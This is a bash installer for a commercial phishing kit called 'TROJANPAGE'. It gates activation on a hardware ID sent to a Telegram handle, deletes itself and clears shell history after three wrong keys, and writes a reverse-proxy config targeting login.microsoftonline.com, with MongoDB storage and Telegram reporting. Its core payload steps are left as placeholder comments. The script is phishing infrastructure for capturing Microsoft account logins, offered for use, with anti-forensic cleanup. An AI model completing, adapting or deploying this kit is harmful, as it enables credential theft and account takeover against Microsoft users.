#!/bin/bash
# 🏛️ TROJANPAGE - ANTI-BRUTEFORCE PRO EDITION
# ------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# --- 1. THE TROJANPAGE HEADER ---
show_header() {
    clear
    echo -e "${BLUE}"
    echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
    echo -e "${NC}"
    echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
    echo " ----------------------------------------------------------------------------------"
}

# --- 2. HWID & KEY LOGIC ---
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')
SECRET_SALT="MY_PRIVATE_PHRASE_2026" 
VALID_KEY=$(echo -n "${HWID}${SECRET_SALT}" | md5sum | cut -c1-10 | tr '[:lower:]' '[:upper:]')

# --- 3. THE 3-STRIKE SENTRY ---
ATTEMPTS=0
while [ $ATTEMPTS -lt 3 ]; do
    show_header
    echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"
    echo -e "${BLUE}[!] Send HWID to @YourUsername on TG for activation.${NC}"
    echo " ----------------------------------------------------------------------------------"
    
    if [ $ATTEMPTS -gt 0 ]; then
        echo -e "${RED}[warning] Attempt $((ATTEMPTS)) of 3 failed. Self-destruct in $((3 - ATTEMPTS)) strikes.${NC}"
    fi

    read -p "ENTER ACTIVATION KEY: " USER_KEY

    if [ "$USER_KEY" == "$VALID_KEY" ]; then
        echo -e "${GREEN}[success] Activation Successful. Initializing...${NC}"
        sleep 2
        break
    else
        ATTEMPTS=$((ATTEMPTS + 1))
        sleep 1
    fi

    if [ $ATTEMPTS -eq 3 ]; then
        echo -e "${RED}[critical] Brute-force detected. Self-destructing...${NC}"
        sleep 1
        rm -- "$0"
        history -c
        clear
        exit 1
    fi
done

# --- 4. VERIFIED SETUP WIZARD ---
echo -e "\n${BLUE}--- CONFIGURATION SETUP (VERIFIED) ---${NC}"

# [TELEGRAM & CLOUDFLARE CHECKS REMAIN AS PER YOUR PROVIDED CODE]

# --- MONGODB CHECK (ATLAS COMPATIBLE) ---
sudo apt update && sudo apt install -y mongodb-clients > /dev/null 2>&1
while true; do
    read -p "Enter MongoDB Hostname (e.g. cluster0.abcde.mongodb.net or localhost): " M_HOST
    read -p "Enter MongoDB User: " M_USER
    read -p "Enter MongoDB Pass: " M_PASS
    echo -ne "[...] Testing Connection to $M_HOST..."
    
    # Validation logic: uses the full URI format to support Atlas +srv or standard hosts
    if mongosh "mongodb+srv://$M_USER:$M_PASS@$M_HOST/admin" --eval "db.adminCommand('listDatabases')" > /dev/null 2>&1 || mongosh "mongodb://$M_USER:$M_PASS@$M_HOST/admin" --eval "db.adminCommand('listDatabases')" > /dev/null 2>&1; then
        echo -e "${GREEN} CONNECTED${NC}"; break
    else
        echo -e "${RED} AUTH FAILED. Check Host, User, or Pass.${NC}"
    fi
done

read -p "Enter Domain (e.g., motarmo.click): " USER_DOMAIN

# --- 5. FINAL DEPLOYMENT ---
CURRENT_DATE=$(date +%s)
EXPIRY=$(($CURRENT_DATE + 7776000))
echo "$HWID:$EXPIRY" > /root/.license

# Create Config with Atlas-compatible URI
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "mongodb": "mongodb+srv://$M_USER:$M_PASS@$M_HOST/trojan_db?retryWrites=true&w=majority"
}
EOF

# [Insert Core Installation, Adobe GUI, and run.sh creation here]

echo -e "${GREEN}[+] DEPLOYED SUCCESSFULY. Type 'start' to begin operations.${NC}"
